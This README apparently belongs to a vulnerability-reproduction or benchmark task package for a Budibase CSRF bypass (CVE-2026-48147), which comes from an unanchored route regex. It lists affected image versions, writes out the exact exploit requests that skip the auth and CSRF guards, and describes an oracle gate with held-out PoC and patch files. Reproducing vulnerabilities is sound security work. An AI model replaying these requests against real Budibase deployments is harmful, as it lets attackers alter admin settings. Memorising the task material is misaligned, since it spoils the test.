# budibase-cve-2026-48147 

Benign **CSRF** canary (CWE-352 via CWE-185, incorrect/unanchored regex) on **real Budibase**
all-in-one Docker images. A route-pattern compiled to an **unanchored regex tested against the full
request URL (including the query string)** lets an attacker inject a public/CSRF-exempt route pattern
into the query string, making a guard skip. The CVE-2026-31816 fix anchored one file
(`server/middleware/utils.ts`) but left the **sibling** `backend-core/middleware/matchers.ts` — used by
the **Worker CSRF middleware** — untouched, which is CVE-2026-48147.

## Versions (verified from real git-tag source)
| role | image | state |
|------|-------|-------|
| V0 | `budibase/budibase:3.31.5` | utils.ts **and** matchers.ts unanchored (both bugs open) |
| V1 (target) | `budibase/budibase:3.32.0` | CVE-2026-31816 fixed in utils.ts; **matchers.ts byte-identical to V0** (worker CSRF-bypass still open) |
| V2 | `budibase/budibase:3.35.4` | CVE-2026-48147 fixed in matchers.ts |

> The build brief assumed V1 = 3.31.5. Source shows the `utils.ts` fix is byte-identical 3.31.4→3.31.5
> and first lands at **3.32.0**; `matchers.ts` is first anchored at **3.35.4**. Versions corrected accordingly.

## The two requests
- **original** (CVE-2026-31816, server `authorized`): `GET /api/tables?/webhooks/trigger` (no session) —
  reaches@V0 (401→500, auth guard skipped), blocked@V1 & V2 (401).
- **residual** (CVE-2026-48147, worker CSRF): `POST /api/global/configs?a=/api/global/auth/x`, admin
  session cookie, `Content-Type: application/x-www-form-urlencoded`, **no** `x-csrf-token`, body
  `type=settings&config[company]=<FLAG>` — reaches@V0 & V1 (200, `GET /api/global/configs/public` →
  `company==FLAG`), blocked@V2 (403 Invalid CSRF token). Control (no injection) = 403 everywhere.

## Run
```bash
docker compose -p pcb-bb48147 --profile v0 --profile v1 --profile v2 up -d
# onboarding is idempotent inside oracle.py
PCB_FLAG=PCB_FLAG_$(openssl rand -hex 4) python3 oracle.py --gate
docker compose -p pcb-bb48147 --profile v0 --profile v1 --profile v2 down -v --rmi all
```

Gate: `original_poc_reaches_flag_on_v0`, `original_poc_blocked_on_v1`,
`bypass_poc_reaches_flag_on_v1`, `bypass_blocked_on_v2` — all **true** (see `repro.log`).

Held-out (`_heldout/`): `bypass_poc.py`, `bypass_patch.diff` (the CVE-2026-48147 matchers.ts fix).
